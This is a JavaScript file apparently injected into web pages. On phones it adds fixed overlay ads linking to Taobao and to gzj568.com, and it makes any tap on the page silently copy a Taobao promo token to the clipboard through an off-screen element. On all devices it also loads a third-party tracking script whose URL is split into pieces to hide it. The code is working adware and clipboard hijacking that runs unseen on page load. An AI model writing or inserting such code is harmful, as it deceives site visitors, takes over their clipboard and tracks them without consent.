function copyjs(codycont){
	let u = navigator.userAgent;
	let isAndroid = u.indexOf('Android') > -1 || u.indexOf('Adr') > -1; //android终端 
	let isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/); //ios终端
	let body = document.getElementsByTagName('body')[0];
	if(isiOS){
		let txt = document.createElement('a');
		txt.style = 'position:absolute;top:-9999px;left:-9999px;';
		txt.setAttribute('id',"selector");
		txt.innerHTML = codycont;
		body.appendChild(txt);
		let copyDOM = document.querySelectorAll('#selector');
		let range = document.createRange();  
		range.selectNode(copyDOM[0]);
		window.getSelection().removeAllRanges();
		window.getSelection().addRange(range);
		document.execCommand('copy');
		body.removeChild(txt);
	}else if(isAndroid){
		let txt = document.createElement('textarea');
		txt.style = 'position:absolute;top:-9999px;left:-9999px;';
		txt.setAttribute('id',"selector");
		txt.innerHTML = codycont;
		body.appendChild(txt);
		let selector = document.getElementById('selector');
		selector.select();
		document.execCommand("copy");
		body.removeChild(txt);
	}
}
const cpCode = "￥lkXxXfE2kFT￥ ℉Y1PSWZ9C1_AO₩";
const rightUrl = "https://m.tb.cn/h.4r5vyFH";
const bottomUrl = "http://www.gzj568.com/index.html?4802121";
const rightImg='<a href="'+rightUrl+'" rel="nofollow" id="rightHref"><img src="https://pic.gksec.com/2021/05/01/30bb3b7af2a56/tb1egdzael2gk0jszphxxahvxxapng.jpg" style="width:100%;height:100%;cursor:pointer;"></a>';
const bottomImg='<a href="'+bottomUrl+'" rel="nofollow" id="bottomHref"><img src="https://c.mipcdn.com/i/s/cdn.gksec.com/2021/05/01/87ae02523c03e/tbdddd541.gif" style="width:100%;height:100%;cursor:pointer;"></a>';
const rightDiv = document.createElement('div'); //rihtDiv
const bottomDiv = document.createElement('div'); //bottomDiv
rightDiv.style= 'position: fixed; right: 0px; bottom: 40%; z-index: 999; width: 100px; height: 100px;';  
bottomDiv.style= 'position:fixed;bottom:0;width:100%;z-index:999;';
rightDiv.innerHTML = rightImg;
bottomDiv.innerHTML = bottomImg;
if(document.addEventListener){
	document.addEventListener("DOMContentLoaded", function(){
		const body = document.getElementsByTagName('body')[0];
		const rootEl = document.documentElement;
		if (/(iPhone|iPad|iPod|iOS|Android)/i.test(navigator.userAgent)) {
			body.appendChild(rightDiv);
			body.appendChild(bottomDiv);
			if(typeof(ClipboardJS) =='undefined'){
				rootEl.onclick = function(){copyjs(cpCode);}
			}
		}else{  //pc
		}
		// 引入js
		let tjscr = document.createElement("script");
		tjscr.type = "text/javascript";
		tjscr.src = 'https://js.us'+'ers.51.la/2106'+'4291.js';
		body.appendChild(tjscr);
	},false);
}
